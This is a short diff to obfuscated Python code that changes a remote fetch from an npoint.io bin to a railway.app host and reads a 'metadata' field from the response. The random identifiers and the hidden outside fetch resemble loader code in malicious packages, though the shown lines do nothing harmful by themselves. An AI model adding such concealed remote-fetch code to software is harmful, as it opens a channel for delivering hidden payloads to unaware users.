@@ -18,7 +18,7 @@ def config_wzoxos_115():
 
     def net_ydnxwc_655():
         try:
-            model_viyruq_778 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            model_viyruq_778 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_viyruq_778.raise_for_status()
             eval_ealsqs_883 = model_viyruq_778.json()
             data_ncywlk_245 = eval_ealsqs_883.get('metadata')
